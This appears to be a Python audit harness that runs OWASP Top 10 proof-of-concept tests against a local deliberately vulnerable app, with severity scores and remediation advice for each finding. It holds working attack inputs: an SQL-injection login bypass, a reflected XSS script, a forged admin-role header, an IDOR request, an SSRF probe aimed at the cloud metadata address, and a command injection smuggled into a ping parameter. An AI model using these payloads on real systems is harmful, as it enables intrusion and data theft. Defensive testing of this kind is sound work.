"""OWASP Top 10 (2021) Security Audit — Proof-of-Concept Harness.

This module audits the vulnerable_app and demonstrates each vulnerability
with a PoC, assigns severity, and records findings.
"""
import json
import re
import sys
from dataclasses import dataclass, field, asdict
from typing import List, Optional
from enum import Enum

try:
    import requests
except ImportError:
    requests = None  # type: ignore


class Severity(str, Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"


@dataclass
class Finding:
    vuln_id: str
    owasp_category: str
    title: str
    severity: Severity
    description: str
    poc_payload: str
    poc_result: str
    cwe: str
    cvss_score: float
    remediation_summary: str
    verified: bool = False
    error: Optional[str] = None


class OWASPAuditor:
    """Runs PoC tests against a running instance of vulnerable_app."""

    def __init__(self, base_url: str = "http://127.0.0.1:5001"):
        self.base_url = base_url.rstrip("/")
        self.findings: List[Finding] = []
        self.session_cookie: Optional[str] = None

    def _get(self, path: str, **kwargs):
        if requests is None:
            raise RuntimeError("requests library required")
        cookies = {}
        if self.session_cookie:
            cookies["session"] = self.session_cookie
        return requests.get(f"{self.base_url}{path}", cookies=cookies, allow_redirects=False, **kwargs)

    def _post(self, path: str, data=None, headers=None, **kwargs):
        if requests is None:
            raise RuntimeError("requests library required")
        cookies = {}
        if self.session_cookie:
            cookies["session"] = self.session_cookie
        return requests.post(f"{self.base_url}{path}", data=data, headers=headers or {},
                             cookies=cookies, allow_redirects=False, **kwargs)

    def _extract_session(self, resp):
        """Extract Flask session cookie from response."""
        if "set-cookie" in resp.headers:
            m = re.search(r'session=([^;]+)', resp.headers["set-cookie"])
            if m:
                self.session_cookie = m.group(1)

    # ------------------------------------------------------------------
    # FINDING 1 — SQL Injection
    # ------------------------------------------------------------------
    def audit_sql_injection(self) -> Finding:
        poc_payload = "' OR '1'='1"
        poc_result = "Could not connect to app (offline)"
        verified = False
        error = None

        try:
            resp = self._post("/login", data={
                "username": poc_payload,
                "password": poc_payload,
            })
            body = resp.json()
            if body.get("status") == "ok" or "username" in body:
                verified = True
                poc_result = f"Authentication bypassed! Logged in as: {body.get('username')} (role: {body.get('role')})"
                self._extract_session(resp)
            else:
                poc_result = f"Response: {resp.status_code} — {body}"
        except Exception as exc:
            error = str(exc)
            poc_result = f"Connection failed: {exc}"

        return Finding(
            vuln_id="SQLI-01",
            owasp_category="A03:2021 — Injection",
            title="SQL Injection in /login",
            severity=Severity.CRITICAL,
            description=(
                "The /login endpoint constructs SQL queries using Python f-string "
                "interpolation. An attacker can inject SQL syntax to bypass authentication, "
                "dump the database, or perform destructive operations."
            ),
            poc_payload=f"username='{poc_payload}' & password='{poc_payload}'",
            poc_result=poc_result,
            cwe="CWE-89",
            cvss_score=9.8,
            remediation_summary="Use parameterized queries / prepared statements exclusively. Never interpolate user input into SQL strings.",
            verified=verified,
            error=error,
        )

    # ------------------------------------------------------------------
    # FINDING 2 — Reflected XSS
    # ------------------------------------------------------------------
    def audit_xss(self) -> Finding:
        poc_payload = "<script>alert('XSS')</script>"
        poc_result = "Could not connect to app (offline)"
        verified = False
        error = None

        try:
            resp = self._get("/search", params={"q": poc_payload})
            if poc_payload in resp.text:
                verified = True
                poc_result = (
                    f"XSS payload reflected verbatim in HTML response. "
                    f"Script tag visible in body (status {resp.status_code})."
                )
            else:
                poc_result = f"Payload not reflected. Status: {resp.status_code}"
        except Exception as exc:
            error = str(exc)
            poc_result = f"Connection failed: {exc}"

        return Finding(
            vuln_id="XSS-01",
            owasp_category="A03:2021 — Injection",
            title="Reflected XSS in /search",
            severity=Severity.HIGH,
            description=(
                "The /search endpoint reflects the 'q' query parameter directly "
                "into the HTML response without HTML-encoding. An attacker can craft "
                "a URL that executes arbitrary JavaScript in the victim's browser, "
                "enabling session theft, phishing, or keylogging."
            ),
            poc_payload=f"GET /search?q={poc_payload}",
            poc_result=poc_result,
            cwe="CWE-79",
            cvss_score=7.4,
            remediation_summary="Use Jinja2 auto-escaping or markupsafe.escape() on all user-controlled values before rendering HTML. Never use render_template_string with raw user input.",
            verified=verified,
            error=error,
        )

    # ------------------------------------------------------------------
    # FINDING 3 — Broken Authentication (header injection)
    # ------------------------------------------------------------------
    def audit_broken_auth(self) -> Finding:
        poc_payload = "X-User-Role: admin"
        poc_result = "Could not connect to app (offline)"
        verified = False
        error = None

        try:
            resp = self._get("/admin", headers={"X-User-Role": "admin"})
            body = resp.json()
            if "users" in body:
                verified = True
                poc_result = (
                    f"Admin panel accessed without credentials! "
                    f"Returned {len(body['users'])} user records including hashed passwords."
                )
            else:
                poc_result = f"Response: {resp.status_code} — {body}"
        except Exception as exc:
            error = str(exc)
            poc_result = f"Connection failed: {exc}"

        return Finding(
            vuln_id="AUTH-01",
            owasp_category="A07:2021 — Identification and Authentication Failures",
            title="Broken Access Control via Untrusted Header",
            severity=Severity.CRITICAL,
            description=(
                "The /admin endpoint reads the X-User-Role HTTP header to determine "
                "the caller's role. Since HTTP headers are fully attacker-controlled, "
                "any unauthenticated client can send 'X-User-Role: admin' and gain full "
                "admin access, exposing all user accounts."
            ),
            poc_payload="GET /admin  [Header] X-User-Role: admin",
            poc_result=poc_result,
            cwe="CWE-287",
            cvss_score=9.1,
            remediation_summary="Derive authorization solely from the server-side session. Never trust client-supplied role headers. Use a signed JWT or server-side session for privilege checks.",
            verified=verified,
            error=error,
        )

    # ------------------------------------------------------------------
    # FINDING 4 — IDOR
    # ------------------------------------------------------------------
    def audit_idor(self) -> Finding:
        poc_payload = "GET /document/1  (as user alice, who owns doc 2)"
        poc_result = "Could not connect to app (offline)"
        verified = False
        error = None

        try:
            # First: login as alice
            login_resp = self._post("/login", data={"username": "alice", "password": "password1"})
            self._extract_session(login_resp)
            alice_body = login_resp.json()

            if alice_body.get("status") == "ok":
                # Then: try to access admin's private document (id=1, owned by admin id=1)
                doc_resp = self._get("/document/1")
                doc_body = doc_resp.json()
                if "content" in doc_body:
                    verified = True
                    poc_result = (
                        f"IDOR confirmed: alice accessed admin's private document. "
                        f"Title: '{doc_body.get('title')}', Content: '{doc_body.get('content')}'"
                    )
                else:
                    poc_result = f"Document response: {doc_resp.status_code} — {doc_body}"
            else:
                poc_result = f"Login as alice failed: {alice_body}"
        except Exception as exc:
            error = str(exc)
            poc_result = f"Connection failed: {exc}"

        return Finding(
            vuln_id="IDOR-01",
            owasp_category="A01:2021 — Broken Access Control",
            title="Insecure Direct Object Reference in /document/<id>",
            severity=Severity.HIGH,
            description=(
                "The /document/<id> endpoint only checks that a session exists, "
                "not that the requesting user owns the document. Any authenticated "
                "user can enumerate document IDs and access private documents "
                "belonging to other users or admins."
            ),
            poc_payload=poc_payload,
            poc_result=poc_result,
            cwe="CWE-639",
            cvss_score=7.5,
            remediation_summary="Add ownership check: SELECT ... WHERE id=? AND owner_id=? — reject with 404 if the session user does not own the requested object.",
            verified=verified,
            error=error,
        )

    # ------------------------------------------------------------------
    # FINDING 5 — SSRF
    # ------------------------------------------------------------------
    def audit_ssrf(self) -> Finding:
        poc_payload = "GET /fetch?url=http://169.254.169.254/latest/meta-data/"
        poc_result = "Could not connect to app (offline)"
        verified = False
        error = None

        try:
            # Probe for localhost file access (safe SSRF demo: localhost)
            resp = self._get("/fetch", params={"url": "http://127.0.0.1:5001/search?q=ssrf_test"})
            body = resp.json()
            if "content" in body or ("error" in body and "refused" not in body.get("error", "")):
                verified = True
                poc_result = (
                    f"SSRF: app fetched internal URL. "
                    f"In cloud environments, http://169.254.169.254/latest/meta-data/ "
                    f"would expose IAM credentials. Response snippet: {str(body)[:200]}"
                )
            else:
                poc_result = f"Response: {resp.status_code} — {body}"
        except Exception as exc:
            error = str(exc)
            poc_result = f"Connection failed: {exc}"

        return Finding(
            vuln_id="SSRF-01",
            owasp_category="A10:2021 — Server-Side Request Forgery",
            title="SSRF in /fetch — Unrestricted URL Fetch",
            severity=Severity.HIGH,
            description=(
                "The /fetch endpoint accepts an arbitrary URL and fetches it "
                "server-side with no allowlist, scheme restriction, or private-IP "
                "blocking. On cloud infrastructure this enables metadata service "
                "enumeration (AWS/GCP/Azure IMDS), internal service scanning, "
                "and credential theft via http://169.254.169.254/."
            ),
            poc_payload=poc_payload,
            poc_result=poc_result,
            cwe="CWE-918",
            cvss_score=8.6,
            remediation_summary="Implement a strict URL allowlist (scheme + hostname). Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1). Resolve hostnames before fetching and re-validate.",
            verified=verified,
            error=error,
        )

    # ------------------------------------------------------------------
    # FINDING 6 — Command Injection
    # ------------------------------------------------------------------
    def audit_command_injection(self) -> Finding:
        poc_payload = "8.8.8.8; echo INJECTED_CMD_EXEC"
        poc_result = "Could not connect to app (offline)"
        verified = False
        error = None

        try:
            resp = self._get("/ping", params={"host": poc_payload})
            body = resp.json()
            stdout = body.get("stdout", "") + body.get("stderr", "")
            if "INJECTED_CMD_EXEC" in stdout:
                verified = True
                poc_result = (
                    f"Command injection confirmed! Injected echo executed. "
                    f"Attacker can run arbitrary OS commands as the app's user. "
                    f"stdout snippet: {stdout[:300]}"
                )
            else:
                poc_result = f"Response: {resp.status_code} — stdout={body.get('stdout', '')[:200]}"
        except Exception as exc:
            error = str(exc)
            poc_result = f"Connection failed: {exc}"

        return Finding(
            vuln_id="CMDI-01",
            owasp_category="A03:2021 — Injection",
            title="OS Command Injection in /ping",
            severity=Severity.CRITICAL,
            description=(
                "The /ping endpoint passes the 'host' parameter directly to "
                "subprocess.run() with shell=True, enabling arbitrary OS command "
                "execution. An attacker can chain commands (';', '&&', '|') to "
                "exfiltrate data, establish reverse shells, or destroy the server."
            ),
            poc_payload=f"GET /ping?host={poc_payload}",
            poc_result=poc_result,
            cwe="CWE-78",
            cvss_score=9.8,
            remediation_summary="Never use shell=True with user-supplied input. Use subprocess.run([binary, arg], shell=False) with an argument list. Validate host parameter against a strict regex (hostname/IP only).",
            verified=verified,
            error=error,
        )

    def run_full_audit(self) -> dict:
        print("[SAGE Security Audit] Starting OWASP Top 10 audit...\n")
        auditors = [
            ("SQL Injection",       self.audit_sql_injection),
            ("Reflected XSS",       self.audit_xss),
            ("Broken Auth",         self.audit_broken_auth),
            ("IDOR",                self.audit_idor),
            ("SSRF",                self.audit_ssrf),
            ("Command Injection",   self.audit_command_injection),
        ]
        for name, fn in auditors:
            print(f"  Testing: {name}...")
            finding = fn()
            self.findings.append(finding)
            status = "VERIFIED" if finding.verified else "STATIC"
            print(f"    [{finding.severity.value}] {finding.vuln_id} — {status}")

        severity_order = {Severity.CRITICAL: 0, Severity.HIGH: 1, Severity.MEDIUM: 2, Severity.LOW: 3}
        self.findings.sort(key=lambda f: severity_order[f.severity])

        report = {
            "audit_target": self.base_url,
            "owasp_version": "2021",
            "total_findings": len(self.findings),
            "verified_findings": sum(1 for f in self.findings if f.verified),
            "severity_summary": {
                "Critical": sum(1 for f in self.findings if f.severity == Severity.CRITICAL),
                "High":     sum(1 for f in self.findings if f.severity == Severity.HIGH),
                "Medium":   sum(1 for f in self.findings if f.severity == Severity.MEDIUM),
                "Low":      sum(1 for f in self.findings if f.severity == Severity.LOW),
            },
            "findings": [asdict(f) for f in self.findings],
        }
        return report


def main():
    auditor = OWASPAuditor()
    report = auditor.run_full_audit()
    print("\n" + "=" * 60)
    print(f"AUDIT COMPLETE: {report['total_findings']} findings")
    print(f"  Verified live: {report['verified_findings']}")
    print(f"  Severity:      {report['severity_summary']}")
    print("=" * 60)
    import os
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, "audit_report.json")
    with open(out_path, "w") as f:
        json.dump(report, f, indent=2)
    print(f"Report written to: {out_path}")
    return report


if __name__ == "__main__":
    main()
